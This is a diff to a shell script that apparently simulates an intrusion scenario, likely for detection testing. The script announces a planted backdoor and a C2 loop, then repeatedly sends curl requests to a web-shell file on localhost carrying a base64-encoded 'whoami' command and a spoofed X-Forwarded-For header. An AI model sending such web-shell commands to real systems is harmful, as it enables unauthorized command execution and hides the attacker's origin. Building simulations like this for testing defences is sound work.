@@ -29,11 +29,16 @@ EOF
 fi
 
 echo "Starting hard scenario attack: backdoor planted ($BACKDOOR_FILE), starting C2 loop from $ATTACKER_IP"
+
+if [ ! -f /tmp/.hard_attack_pid ]; then
+    echo $$ > /tmp/.hard_attack_pid
+fi
+
 while true; do
     for i in {1..5}; do
         curl -s -H "X-Forwarded-For: $ATTACKER_IP" \
-            -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 [$$]" \
-            "http://localhost/$BACKDOOR_FILE?cmd=$(echo -n 'whoami' | base64)" > /dev/null &
+        -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 [$$]" \
+        "http://localhost/$BACKDOOR_FILE?cmd=$(echo -n 'whoami' | base64)" > /dev/null &
     done
     wait
     sleep 0.2
